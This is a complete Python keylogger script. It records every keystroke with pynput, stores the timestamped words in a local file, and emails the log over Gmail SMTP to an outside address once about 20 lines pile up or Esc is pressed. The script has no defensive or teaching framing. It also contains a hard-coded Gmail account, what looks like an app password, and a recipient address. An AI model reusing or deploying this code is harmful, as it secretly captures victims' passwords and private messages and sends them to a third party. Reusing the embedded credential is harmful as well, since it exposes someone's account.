#!/usr/bin/python3

import time
from pynput import keyboard
import smtplib

#The dictionary senteces is to save the text, and the time when is write
senteces = {}
text = ''

def on_press(key):
	"""This function the key who is press, when is press"""

	global text
	global senteces

	if key == keyboard.Key.space or key == keyboard.Key.enter:
		if len(text) != 0:
			senteces[time.asctime()] =  str(text)
			save_senteces(senteces)
			print(senteces)
			text = ''
			senteces = dict()
	else:
		if key == keyboard.Key.backspace:
			text = text[:-1]
		else:
			text += str(key).replace("'","")


def on_release(key):
	"""This funtion run when the key is release"""

	if key == keyboard.Key.esc:
		send_logger_in_email()
		return False

def save_senteces(senteces):
	"""This function run when the key is release, if key press is [esc} finish"""

	with open('senteces.txt',  'a') as f:
		for time,text in senteces.items():
			f.write(text + ' - ' + str(time + '\n'))
			try:
				if len(get_save_senteces()) > 20 : send_logger_in_email()
			except:
				print('sem conexão com intenert')



def get_save_senteces() -> list :
	"""Load save senteces"""
	words = list()

	with open('senteces.txt', 'r') as file:
		for x in file.readlines():
			words.append(x)

	return words

def send_logger_in_email():
	"""Function to send logs in e-mail"""
	sender = 'matiasdev30@gmail.com'
	receiver = 'null.comercial@gmail.com'

	message = ''

	for x in get_save_senteces():
		message += (x + '\n')

	try:
		gmail_smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
		gmail_smtpserver.starttls()
		gmail_smtpserver.login(user='matiasdev30@gmail.com', password='utupnktutziifcbi')
		gmail_smtpserver.sendmail(sender, receiver, message)
		gmail_smtpserver.quit() 
		open('senteces.txt', 'w').close()
		print('logs sent')
	except Exception:
		print('Logs not sent, recorded offline')

if __name__ == '__main__':
	with keyboard.Listener(on_press= on_press, on_release=on_release) as listener:
		listener.join()
